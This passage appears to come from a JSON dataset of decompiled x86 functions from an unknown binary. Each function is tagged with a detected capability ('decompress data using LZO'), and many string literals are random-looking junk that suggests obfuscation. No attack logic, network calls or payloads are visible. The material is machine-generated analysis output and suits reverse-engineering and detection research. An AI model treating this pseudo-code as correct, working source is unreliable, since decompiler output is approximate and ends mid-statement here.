*puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    int32_t *piVar18;\n    \n    piStack44 = &stack0xffffff40;\n    puStack32 = &stack0xffffff40;\n    uStack24 = 0x44c2c0;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iStack68 = param_1 + 0x10;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x20) = 0;\n    *(param_1 + 0x24) = 0xf;\n    *(param_1 + 0x10) = 0;\n    iStack64 = param_1 + 0x28;\n    *(param_1 + 0x28) = 0;\n    *(param_1 + 0x38) = 0;\n    *(param_1 + 0x3c) = 0xf;\n    *(param_1 + 0x28) = 0;\n    iStack60 = param_1 + 0x50;\n    *(param_1 + 0x50) = 0;\n    *(param_1 + 0x60) = 0;\n    *(param_1 + 100) = 0xf;\n    *(param_1 + 0x50) = 0;\n    *(param_1 + 0x68) = 0;\n    *(param_1 + 0x78) = 0;\n    *(param_1 + 0x7c) = 0xf;\n    *(param_1 + 0x68) = 0;\n    iStack196 = param_1 + 0x68;\n    piStack40 = &stack0xfffffef0;\n    uStack216 = 0;\n    uStack212 = 0xf;\n    uStack232 = 0;\n    uStack20 = 6;\n    iStack72 = param_1;\n    iStack56 = iStack196;\n    fcn.00402f72(0x10);\n    piVar1 = piStack40;\n    piStack40[7] = 0xf;\n    piVar1[6] = 8;\n    piVar1[3] = 0x716e6279;\n    piVar1[2] = 0x726c6c78;\n    *(piVar1 + 4) = 0;\n    *piVar1 = &stack0xffffff40;\n    piVar1[1] = 0x1473;\n    *(piVar1 + 8) = 0;\n    piVar1[9] = 0xb2c;\n    iVar2 = *0x54206c;\n    iVar12 = *0x542068;\n    iVar11 = *0x542064;\n    piVar1[0x10] = *0x542060;\n    piVar1[0x11] = iVar11;\n    piVar1[0x12] = iVar12;\n    piVar1[0x13] = iVar2;\n    fcn.004057b8();\n    piVar1 = piStack44;\n    if (0xf < uStack172) {\n        uVar8 = uStack172 + 1;\n        uVar10 = auStack192[0];\n        if (uVar8 < 0x1000) {\ncode_r0x00426df0:\n            piStack44[-1] = uVar8;\n            piVar1[-2] = uVar10;\n            piVar1[-3] = 0x426df7;\n            fcn.00401a32(piVar1[-2]);\n            goto code_r0x00426dfa;\n        }\n        uVar10 = *(auStack192[0] - 4);\n        if ((auStack192[0] - 4) - uVar10 < 0x20) {\n            uVar8 = uStack172 + 0x24;\n            goto code_r0x00426df0;\n        }\n        uStack20 = 0;\n        piStack44[-1] = 0x4275fa;\n        fcn.004047f5();\n        piVar20 = piVar1;\ncode_r0x004275fa:\n        uStack20 = 1;\n        piVar20[-1] = 0x427606;\n        fcn.004047f5();\ncode_r0x00427606:\n        uStack20 = 2;\n        piVar20[-1] = 0x427612;\n        fcn.004047f5();\ncode_r0x00427612:\n        uStack20 = 3;\n        *(piVar20 + -4) = 0x42761e;\n        fcn.004047f5();\ncode_r0x0042761e:\n        uStack20 = 4;\n        *(piVar20 + -4) = 0x42762a;\n        fcn.004047f5();\ncode_r0x0042762a:\n        uStack20 = 5;\n        *(piVar20 + -4) = 0x427636;\n        fcn.004047f5();\n        *(piVar20 + -4) = &stack0xfffffffc;\n        *(piVar20 + -100) = 0x42764c;\n        fcn.004052d1();\n        *(piVar20 + -100) = &stack0x00000008;\n        *(piVar20 + -0xc4) = 0x42765c;\n        fcn.004052d1();\n        *(piVar20 + -0xc4) = &stack0x00000014;\n        *(piVar20 + -0x124) = 0x42766c;\n        fcn.004052d1();\n        *(piVar20 + -0x124) = &stack0x00000020;\n        *(piVar20 + -0x184) = 0x42767c;\n        fcn.004052d1();\n        *(piVar20 + -0x184) = &stack0x0000002c;\n        *(piVar20 + -0x1e4) = 0x42768c;\n        fcn.004052d1();\n        *(piVar20 + -0x1e4) = &stack0x00000038;\n        *(piVar20 + -0x244) = 0x42769c;\n        fcn.004052d1();\n        *(piVar20 + -0x244) = &stack0x00000044;\n        *(piVar20 + -0x2a4) = 0x4276af;\n        iVar11 = fcn.00403a76();\n        return iVar11;\n    }\ncode_r0x00426dfa:\n    uStack176 = 0;\n    uStack172 = 0xf;\n    auStack192[0] = auStack192[0] & 0xffffff00;\n    piVar1[-6] = &stack0xffffff58;\n    piVar1[-3] = 0;\n    piVar1[-7] = 0x426e2e;\n    fcn.004047d7();\n    uVar8 = uStack148;\n    if (0xf < uStack148) {\n        uVar8 = uStack148 + 1;\n        uVar10 = uStack168;\n        if (0xfff < uVar8) {\n            uVar10 = *(uStack168 - 4);\n            piVar20 = piVar1 + -6;\n            if (0x1f < (uStack168 - 4) - uVar10) goto code_r0x004275fa;\n            uVar8 = uStack148 + 0x24;\n        }\n        piVar1[-7] = uVar8;\n        piVar1[-8] = uVar10;\n        piVar1[-9] = 0x426e69;\n        uVar8 = fcn.00401a32(piVar1[-8]);\n    }\n    uStack152 = 0;\n    uStack148 = 0xf;\n    uStack168 = uStack168 & 0xffffff00;\n    piStack44 = piVar1 + -6;\n    piVar1[-7] = uVar8;\n    piStack40 = piVar1 + -0x11;\n    piVar1[-0x10] = 0;\n    piVar1[-0xc] = 0;\n    piVar1[-0xb] = 0xf;\n    *(piVar1 + -0x10) = 0;\n    *(piVar1 + -0x13) = uStack36;\n    piVar1[-0x12] = \"yahdlglerrmwamaonknvwonoufsenidiancnovhgwbwmhzfkkvnc\";\n    piVar1[-0x14] = 0x34;\n    piVar1[-0x15] = 0x426ecd;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    *piStack40 = 0xfd7;\n    *(puVar5 + 7) = 0;\n    *(puVar5 + 8) = 0;\n    puVar5[10] = 0x40af5c00;\n    puVar5[9] = 0;\n    piVar1[-0x15] = 0x426ef1;\n    uVar9 = fcn.00404b6f();\n    piVar1 = piStack44;\n    piStack44[-1] = uVar9;\n    piStack40 = piVar1 + -10;\n    piVar1[-9] = 0;\n    piVar1[-5] = 0;\n    piVar1[-4] = 0xf;\n    *(piVar1 + -9) = 0;\n    *(piVar1 + -0xc) = uStack36;\n    piVar1[-0xb] = \"ylzvlszrywxuevucwrzklmigheewdpcyquhaortvcahdyuqgtxjzptgsoavbpfwtnltuxvbjuub\";\n    piVar1[-0xd] = 0x4b;\n    piVar1[-0xe] = 0x426f39;\n    fcn.00402f72();\n    piVar20 = piStack40;\n    *piStack40 = &stack0xffffff70;\n    piVar20[7] = 0x188f;\n    piVar20[9] = 0x40e30280;\n    piVar20[8] = 0;\n    piVar1[-0xe] = 0x426f5e;\n    fcn.0040476e();\n    piVar1 = piStack44;\n    if (0xf < uStack124) {\n        uVar8 = uStack124 + 1;\n        uVar10 = uStack144;\n        if (0xfff < uVar8) {\n            uVar10 = *(uStack144 - 4);\n            piVar20 = piStack44;\n            if (0x1f < (uStack144 - 4) - uVar10) goto code_r0x00427606;\n            uVar8 = uStack124 + 0x24;\n        }\n        piStack44[-1] = uVar8;\n        piVar1[-2] = uVar10;\n        piVar1[-3] = 0x426f99;\n        fcn.00401a32(piVar1[-2]);\n    }\n    uStack128 = 0;\n    uStack124 = 0xf;\n    uStack144 = uStack144 & 0xffffff00;\n    piVar1[-1] = 0x20;\n    piVar1[-2] = 0x426fb8;\n    uVar9 = fcn.004024b9(piVar1[-1], *piVar1);\n    piVar1[-1] = 0x20;\n    piVar1[-2] = uVar9;\n    piVar1[-3] = 0x426fc3;\n    fcn.00401a32(piVar1[-2]);\n    piStack40 = piVar1 + -0xe;\n    piStack44 = piVar1;\n    piVar1[-0xe] = 0;\n    piVar1[-10] = 0;\n    piVar1[-9] = 0xf;\n    *(piVar1 + -0xe) = 0;\n    *(piVar1 + -0x10) = uStack36;\n    piVar1[-0xf] = \"myogxudgvpfcemrdmjdctwtyzx\";\n    piVar1[-0x11] = 0x1a;\n    piVar1[-0x12] = 0x427006;\n    fcn.00402f72();\n    puVar6 = piStack40;\n    *(piStack40 + 0x18) = 0;\n    *(puVar6 + 0x20) = 0x40996000;\n    *(puVar6 + 0x1c) = 0;\n    puVar6[0x24] = 1;\n    uVar4 = *0x54208c;\n    uVar3 = *0x542088;\n    uVar9 = *0x542084;\n    *(puVar6 + 0x28) = *0x542080;\n    *(puVar6 + 0x2c) = uVar9;\n    *(puVar6 + 0x30) = uVar3;\n    *(puVar6 + 0x34) = uVar4;\n    piVar1[-0x12] = 0x42702f;\n    uVar9 = fcn.00404ae3();\n    piVar1 = piStack44;\n    piVar13 = piStack44 + -1;\n    piStack44[-1] = uVar9;\n    piStack40 = piVar1 + -0x17;\n    piStack48 = piVar1 + -6;\n    piVar1[-6] = 0;\n    piVar1[-2] = 0;\n    *piVar13 = 0xf;\n    *(piVar1 + -6) = 0;\n    *(piVar1 + -0x19) = uStack36;\n    piVar1[-0x18] = \"orxhgdpojlguhpcsqoiuqldnnyjqztcofghjvhxcozmecwoyaubrorryftbbvlttjctibjhnlzqqmfss\";\n    piVar1[-0x1a] = 0x50;\n    piVar1[-0x1b] = 0x427078;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    puStack52 = piStack40 + 8;\n    piStack40[8] = 0;\n    puVar5[0xc] = 0;\n    puVar5[0xd] = 0xf;\n    *(puVar5 + 8) = 0;\n    uStack20 = 0xc;\n    *(piVar1 + -0x1c) = uStack36;\n    piVar1[-0x1b] = \"kqqxojjgdybvsitdyjasefrncdvyoiuavahgoqittkhiy\";\n    piVar1[-0x1d] = 0x2d;\n    piVar1[-0x1e] = 0x4270bf;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    piStack40[2] = 0;\n    puVar5[6] = 0;\n    puVar5[7] = 0xf;\n    *(puVar5 + 2) = 0;\n    uStack20 = 0xd;\n    *(piVar1 + -0x1f) = uStack36;\n    piVar1[-0x1e] = \"aglmcxfdvpmhxjdlotjsffsdixyucjpypipnkijgyhfywnqgzgkphglnakvvk\";\n    piVar1[-0x20] = 0x3d;\n    piVar1[-0x21] = 0x427105;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    *piStack40 = 0x771;\n    puVar5[1] = 0x20b;\n    puVar5[0xf] = 0x40c59d80;\n    puVar5[0xe] = 0;\n    puVar5[0x10] = 0x95;\n    piVar1[-0x21] = 0x42712f;\n    fcn.004058b7();\n    piVar1 = piStack44;\n    uStack20 = 6;\n    piVar14 = piStack44 + -1;\n    piStack44[-1] = 0x50;\n    piVar1[-2] = 0x427140;\n    uVar9 = fcn.004024b9(*piVar14, *piVar1);\n    piVar1[-1] = 0x50;\n    piVar1[-2] = uVar9;\n    piVar1[-3] = 0x42714b;\n    fcn.00401a32(piVar1[-2]);\n    piStack40 = piVar1;\n    piVar1[-6] = 0;\n    piVar1[-2] = 0;\n    piVar1[-1] = 0xf;\n    *(piVar1 + -6) = 0;\n    *(piVar1 + -8) = uStack36;\n    piVar1[-7] = \"ozpgtkosohkczeshlfivoikxecmbxitziufcvcqgsqcmzngcvtikuzwmzkjzlnxkvrgvqicumavixittgshrjdnddvwvxqvmftd\";\n    piVar1[-9] = 99;\n    piVar1[-10] = 0x42718b;\n    fcn.00402f72();\n    piVar1[-10] = 0x427190;\n    uVar9 = fcn.00404566();\n    piVar20 = piStack40;\n    piStack44 = piStack40;\n    piStack40[-1] = uVar9;\n    piStack40[-0xb] = 0;\n    piStack40[-7] = 0;\n    piStack40[-6] = 0xf;\n    piVar1 = piStack40 + -0xb;\n    piStack40 = piStack40 + -0xd;\n    *piVar1 = 0;\n    *(piVar20 + -0xf) = uStack36;\n    piVar20[-0xe] = \"cflmrwyzhupcjfmfar\";\n    piVar20[-0x10] = 0x12;\n    piVar20[-0x11] = 0x4271d9;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    piStack40[1] = 0x40884800;\n    *puVar5 = 0;\n    puVar5[9] = 0x40f32020;\n    puVar5[8] = 0;\n    *(puVar5 + 10) = 1;\n    *(puVar5 + 0xb) = 0;\n    *(puVar5 + 0xc) = 0;\n    piVar20[-0x11] = 0x427208;\n    uVar9 = fcn.00405ac9();\n    piVar1 = piStack44;\n    piVar15 = piStack44 + -1;\n    piStack44[-1] = uVar9;\n    piStack40 = piVar1 + -0x15;\n    piStack48 = piVar1 + -6;\n    piVar1[-6] = 0;\n    piVar1[-2] = 0;\n    *piVar15 = 0xf;\n    *(piVar1 + -6) = 0;\n    *(piVar1 + -0x17) = uStack36;\n    piVar1[-0x16] = \"gucdsnrdbazvdbsuvjinglezzprrjnkvucmrzuvtqofstoynvpmzsaxeizremgbeyc\";\n    piVar1[-0x18] = 0x42;\n    piVar1[-0x19] = 0x427253;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    puStack52 = piStack40 + 9;\n    piStack40[9] = 0;\n    puVar5[0xd] = 0;\n    puVar5[0xe] = 0xf;\n    *(puVar5 + 9) = 0;\n    uStack20 = 10;\n    *(piVar1 + -0x1a) = uStack36;\n    piVar1[-0x19] = \"xvurkzztobhsqpjjtnkaxzqtbryizplaikmdwv\";\n    piVar1[-0x1b] = 0x26;\n    piVar1[-0x1c] = 0x42729a;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    piStack40[1] = 0;\n    puVar5[5] = 0;\n    puVar5[6] = 0xf;\n    *(puVar5 + 1) = 0;\n    uStack20 = 0xb;\n    *(piVar1 + -0x1d) = uStack36;\n    piVar1[-0x1c] = \"rvlwtavgvogiarogodxfjzmyumuehghwzgcviluzcshyunmwxyhumbstmcxizuurmtl\";\n    piVar1[-0x1e] = 0x43;\n    piVar1[-0x1f] = 0x4272e0;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    *piStack40 = 0xe0;\n    puVar5[8] = 0x40d940c0;\n    puVar5[7] = 0;\n    uStack20 = 6;\n    piVar1[-0x1f] = 0x427303;\n    uVar9 = fcn.00401370();\n    piVar1 = piStack44;\n    piStack44[-1] = uVar9;\n    piStack40 = piVar1 + -0x10;\n    piStack48 = piVar1 + -7;\n    piVar1[-2] = 0xf;\n    piVar1[-3] = 0xc;\n    piVar1[-5] = 0x736c7979;\n    *(piVar1 + -4) = 0;\n    piVar1[-0xd] = 0;\n    iVar2 = str.snwvwspc._4_4_;\n    iVar12 = str.snwvwspc._0_4_;\n    iVar11 = *0x5420a4;\n    piVar1[-9] = *0x5420a0;\n    piVar1[-8] = iVar11;\n    piVar1[-7] = iVar12;\n    piVar1[-6] = iVar2;\n    *(piVar1 + -0xd) = 0;\n    uStack20 = 9;\n    *(piVar1 + -0x12) = uStack36;\n    piVar1[-0x11] = \"zkiknugajkrmpycbvqzlnwucibjotoqpcmaisqcjdnxhefccxyukknjkkmxonmeakjrwmqjidhxozizm\";\n    piVar1[-0x13] = 0x50;\n    piVar1[-0x14] = 0x42736c;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    piStack40[1] = 0x405bc000;\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    *(puVar5 + 0xf) = 1;\n    uStack20 = 6;\n    piVar1[-0x14] = 0x427390;\n    uVar9 = fcn.0040644c();\n    piVar1 = piStack44;\n    piStack40 = piStack44;\n    piVar16 = piStack44 + -1;\n    piStack44[-1] = uVar9;\n    piVar17 = piStack44 + -0xc;\n    piVar18 = piStack44 + -0xc;\n    piStack44 = piStack44 + -6;\n    *piVar16 = 0xf;\n    piVar1[-2] = 10;\n    *(piVar1 + -4) = 0x6862;\n    *(piVar1 + -0xe) = 0;\n    *piVar17 = 0;\n    iVar2 = str.xnddvrwy._4_4_;\n    iVar12 = str.xnddvrwy._0_4_;\n    iVar11 = *0x5420c4;\n    piVar1[-8] = *0x5420c0;\n    piVar1[-7] = iVar11;\n    piVar1[-6] = iVar12;\n    piVar1[-5] = iVar2;\n    *piVar18 = 0;\n    uStack20 = 8;\n    *(piVar1 + -0xe) = uStack36;\n    piVar1[-0xd] = \"cbgmprkjljogjavizgqlbxqseeaklkuhuifcgzgkzjagyqquzhe\";\n    piVar1[-0xf] = 0x33;\n    piVar1[-0x10] = 0x4273f3;\n    fcn.00402f72();\n    uStack20 = 6;\n    piVar1[-0x10] = 0x4273ff;\n    fcn.00403391();\n    piVar1 = piStack40;\n    piVar20 = piStack40 + -1;\n    piStack40[-1] = &stack0xffffff88;\n    piVar1[-2] = 0x42740b;\n    fcn.00401ee2();\n    if (0xf < uStack100) {\n        uVar8 = uStack100 + 1;\n        uVar10 = uStack120;\n        if (0xfff < uVar8) {\n            uVar10 = *(uStack120 - 4);\n            if (0x1f < (uStack120 - 4) - uVar10) goto code_r0x00427612;\n            uVar8 = uStack100 + 0x24;\n        }\n        piVar1[-2] = uVar8;\n        piVar1[-3] = uVar10;\n        piVar1[-4] = 0x427440;\n        fcn.00401a32(piVar1[-3]);\n    }\n    uStack104 = 0;\n    uStack100 = 0xf;\n    uStack120 = uStack120 & 0xffffff00;\n    piVar20 = piVar1 + -2;\n    piVar1[-2] = &stack0xffffffa0;\n    piVar1[-3] = 0x42745e;\n    fcn.0040191f();\n    uVar8 = uStack76;\n    if (0xf < uStack76) {\n        uVar8 = uStack76 + 1;\n        uVar10 = uStack96;\n        if (0xfff < uVar8) {\n            uVar10 = *(uStack96 - 4);\n            if (0x1f < (uStack96 - 4) - uVar10) goto code_r0x0042761e;\n            uVar8 = uStack76 + 0x24;\n        }\n        piVar1[-3] = uVar8;\n        piVar1[-4] = uVar10;\n        piVar1[-5] = 0x427493;\n        uVar8 = fcn.00401a32(piVar1[-4]);\n    }\n    uStack80 = 0;\n    uStack76 = 0xf;\n    uStack96 = uStack96 & 0xffffff00;\n    piStack44 = piVar1 + -2;\n    piVar1[-3] = uVar8;\n    piStack40 = piVar1 + -0x12;\n    piStack48 = piVar1 + -8;\n    piVar1[-8] = 0;\n    piVar1[-4] = 0;\n    piVar1[-3] = 0xf;\n    *(piVar1 + -8) = 0;\n    *(piVar1 + -0x14) = uStack36;\n    piVar1[-0x13] = \"inrzsxdlikaqxpkrjxqzhchtgucj\";\n    piVar1[-0x15] = 0x1c;\n    piVar1[-0x16] = 0x4274f1;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    *piStack40 = 0;\n    puVar5[4] = 0;\n    puVar5[5] = 0xf;\n    *puVar5 = 0;\n    uStack20 = 7;\n    *(piVar1 + -0x17) = uStack36;\n    piVar1[-0x16] = \"izodrgjgtvxrafxbsxpcgnvzxhfn\";\n    piVar1[-0x18] = 0x1c;\n    piVar1[-0x19] = 0x427530;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    piStack40[6] = 0x17b2;\n    *(puVar5 + 7) = 1;\n    puVar5[9] = 0x40ba6200;\n    puVar5[8] = 0;\n    uStack20 = 6;\n    piVar1[-0x19] = 0x427558;\n    uVar9 = fcn.00401951();\n    piVar1 = piStack44;\n    piVar19 = piStack44 + -1;\n    piStack44[-1] = uVar9;\n    piStack40 = piVar1 + -7;\n    piVar1[-6] = 0;\n    piVar1[-2] = 0;\n    *piVar19 = 0xf;\n    *(piVar1 + -6) = 0;\n    piVar20 = piVar1 + -10;\n    *(piVar1 + -9) = uStack36;\n    piVar1[-8] = \"hljqrjoqplzvypcetqikaczltsxoegwiqveqrssuuapwekjrazi\";\n    piVar1[-10] = 0x33;\n    piVar1[-0xb] = 0x4275a0;\n    fcn.00402f72();\n    piVar7 = piStack40;\n    *piStack40 = 1;\n    uVar8 = piVar7[6];\n    if (0xf < uVar8) {\n        iVar11 = piVar7[1];\n        uVar10 = uVar8 + 1;\n        iVar12 = iVar11;\n        if (0xfff < uVar10) {\n            iVar12 = *(iVar11 + -4);\n            if (0x1f < (iVar11 + -4) - iVar12) goto code_r0x0042762a;\n            uVar10 = uVar8 + 0x24;\n        }\n        piVar1[-0xb] = uVar10;\n        piVar1[-0xc] = iVar12;\n        piVar1[-0xd] = 0x4275d7;\n        fcn.00401a32(piVar1[-0xc]);\n    }\n    *in_FS_OFFSET = iStack28;\n    return iStack72;\n}\n",
        "token_count": 7544
    },
    "00428190": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00428190(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t arg_8h;\n    int32_t *arg_8h_00;\n    uint32_t unaff_EBX;\n    int32_t **in_FS_OFFSET;\n    uint uStack248;\n    uchar uStack244;\n    char *pcStack240;\n    int32_t iStack236;\n    uint uStack220;\n    uint32_t uStack216;\n    int32_t iStack212;\n    uint uStack196;\n    uint32_t uStack192;\n    int32_t iStack188;\n    uint uStack172;\n    uint32_t uStack168;\n    int32_t iStack164;\n    uint uStack148;\n    uint32_t uStack144;\n    uint *puStack140;\n    uchar uStack136;\n    uint *puStack132;\n    int32_t *piStack128;\n    uint uStack124;\n    uint uStack120;\n    int32_t iStack116;\n    uint *puStack96;\n    int32_t iStack92;\n    uint32_t uStack72;\n    uchar uStack68;\n    char *pcStack64;\n    int32_t iStack60;\n    uint32_t uStack56;\n    uint uStack44;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint32_t *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &uStack72;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c300;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack68 = uStack36;\n    pcStack64 = \"apzrtkhjpsrwcuxizhrkrglouznogvvzxnwfiemochurmlzpzvhyp\";\n    uStack72 = 0x35;\n    fcn.00402f72();\n    if (uStack40 < 0x10) {\ncode_r0x0042822d:\n        *in_FS_OFFSET = piStack28;\n        return piStack28;\n    }\n    iStack116 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iStack116 = *(iStack60 + -4),  (iStack60 + -4) - iStack116 < 0x20)) {\n        fcn.00401a32(iStack116);\n        goto code_r0x0042822d;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack132 = &uStack248;\n    uStack124 = 0x44c310;\n    piStack128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack128;\n    puStack140 = puStack96;\n    uStack220 = 0;\n    uStack216 = 0xf;\n    iStack236 = 0;\n    uStack120 = 7;\n    uStack244 = iStack188;\n    pcStack240 = \"wlnxjlfhenrviskjmqxsftgrkaoygcydgyxufioowfjqhftltmhexgha\";\n    uStack248 = 0x38;\n    fcn.00402f72();\n    uStack172 = 0;\n    uStack168 = 0xf;\n    iStack188 = 0;\n    uStack120 = 8;\n    fcn.00402f72(0x40, iStack164, \"taisaxargfukyhfkcucpxqfhmwobangaqlhuflreptprlzwtpukihqrmkensaydz\");\n    uStack148 = 0;\n    uStack144 = 0xf;\n    iStack164 = 0;\n    uStack120 = 9;\n    fcn.00402f72(0x40, iStack212, \"taisaxargfukyhfkcucpxqfhmwobangaqlhuflreptprlzwtpukihqrmkensaydz\");\n    uStack196 = 0;\n    uStack192 = 0xf;\n    iStack212 = 0;\n    uStack120 = 10;\n    fcn.00402f72(0x40, uStack136, \"taisaxargfukyhfkcucpxqfhmwobangaqlhuflreptprlzwtpukihqrmkensaydz\");\n    if (uStack192 < 0x10) {\ncode_r0x004283dd:\n        if (0xf < uStack144) {\n            iVar2 = iStack164;\n            if ((0xfff < uStack144 + 1) && (iVar2 = *(iStack164 + -4),  0x1f < (iStack164 + -4) - iVar2))\n            goto code_r0x004285b2;\n            fcn.00401a32(iVar2);\n        }\n        *puStack140 = 0;\n        puStack140[5] = 0xf;\n        puStack140[4] = 7;\n        *puStack140 = 0x78717170;\n        *(puStack140 + 3) = 0x76647a78;\n        *(puStack140 + 7) = 0;\n        if (0xf < uStack168) {\n            iVar2 = iStack188;\n            if ((0xfff < uStack168 + 1) && (iVar2 = *(iStack188 + -4),  0x1f < (iStack188 + -4) - iVar2))\n            goto code_r0x004285be;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack216) {\n            iVar2 = iStack236;\n            if ((0xfff < uStack216 + 1) && (iVar2 = *(iStack236 + -4),  0x1f < (iStack236 + -4) - iVar2))\n            goto code_r0x004285ca;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack72) {\n            iVar2 = iStack92;\n            if ((0xfff < uStack72 + 1) && (iVar2 = *(iStack92 + -4),  0x1f < (iStack92 + -4) - iVar2))\n            goto code_r0x004285d6;\n            fcn.00401a32(iVar2);\n        }\n        uStack72 = 0xf;\n        if (0xf < uStack36) {\n            arg_8h = uStack56;\n            if ((0xfff < uStack36 + 1) && (arg_8h = *(uStack56 - 4),  0x1f < (uStack56 - 4) - arg_8h))\n            goto code_r0x004285e2;\n            fcn.00401a32(arg_8h);\n        }\n        uStack40 = 0;\n        uStack36 = 0xf;\n        uStack56 = uStack56 & 0xffffff00;\n        if (0xf < unaff_EBX) {\n            arg_8h_00 = piStack28;\n            if ((0xfff < unaff_EBX + 1) && (arg_8h_00 = piStack28[-1],  0x1f < piStack28 + (-4 - arg_8h_00)))\n            goto code_r0x004285ee;\n            fcn.00401a32(arg_8h_00);\n        }\n        *in_FS_OFFSET = piStack128;\n        return puStack96;\n    }\n    iVar2 = iStack212;\n    if ((uStack192 + 1 < 0x1000) || (iVar2 = *(iStack212 + -4),  (iStack212 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x004283dd;\n    }\n    uStack120 = 0;\n    fcn.004047f5();\ncode_r0x004285b2:\n    uStack120 = 1;\n    fcn.004047f5();\ncode_r0x004285be:\n    uStack120 = 2;\n    fcn.004047f5();\ncode_r0x004285ca:\n    uStack120 = 3;\n    fcn.004047f5();\ncode_r0x004285d6:\n    uStack120 = 4;\n    fcn.004047f5();\ncode_r0x004285e2:\n    uStack120 = 5;\n    fcn.004047f5();\ncode_r0x004285ee:\n    uStack120 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 2076
    },
    "0042bc80": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.0042bc80(void)\n\n{\n    uint uVar1;\n    int32_t arg_8h;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c400;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (0xf < in_stack_00000030) {\n        arg_8h = in_stack_0000001c;\n        if ((0xfff < in_stack_00000030 + 1) &&\n           (arg_8h = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - arg_8h)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            uVar1 = fcn.004052d1();\n            return uVar1;\n        }\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(arg_8h);\n    }\n    *in_FS_OFFSET = piStack28;\n    return 0xde1c;\n}\n",
        "token_count": 317
    },
    "0042d9e0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0042d9e0(int32_t param_1)\n\n{\n    uchar **ppuVar1;\n    int32_t iVar2;\n    int32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    int32_t unaff_retaddr;\n    uint32_t in_stack_00000014;\n    uint32_t in_stack_00000018;\n    uchar *in_stack_0000002c;\n    uint32_t in_stack_00000040;\n    uint uStack232;\n    uchar uStack228;\n    char *pcStack224;\n    int32_t iStack220;\n    uint uStack204;\n    uint32_t uStack200;\n    int32_t iStack196;\n    uint uStack180;\n    uint32_t uStack176;\n    int32_t iStack172;\n    uint uStack156;\n    uint32_t uStack152;\n    uchar uStack148;\n    uint *puStack144;\n    int32_t *piStack140;\n    uint uStack136;\n    uint uStack132;\n    uchar *puStack128;\n    int32_t iStack124;\n    uchar **ppuStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    int32_t in_stack_ffffffd8;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint32_t uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c4a0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (in_stack_00000018 < 0x10) {\ncode_r0x0042da43:\n        *in_FS_OFFSET = piStack28;\n        return 0x9815;\n    }\n    iStack60 = param_1;\n    if ((in_stack_00000018 + 1 < 0x1000) || (iStack60 = *(param_1 + -4),  (param_1 + -4) - iStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iStack60);\n        goto code_r0x0042da43;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    ppuStack76 = &ppuStack76;\n    puStack128 = &stack0xffffffd8;\n    uStack64 = 0xffffffff;\n    uStack68 = 0x44c4b0;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    ppuVar1 = &ppuStack76;\n    if (uStack20 < 0x10) {\ncode_r0x0042dae7:\n        ppuStack76 = ppuVar1;\n        uStack24 = 0;\n        uStack20 = 0xf;\n        if (0xf < in_stack_00000014) {\n            iStack124 = unaff_retaddr;\n            if ((0xfff < in_stack_00000014 + 1) &&\n               (iStack124 = *(unaff_retaddr + -4),  unaff_EDI = iStack124,  0x1f < (unaff_retaddr + -4) - iStack124))\n            goto 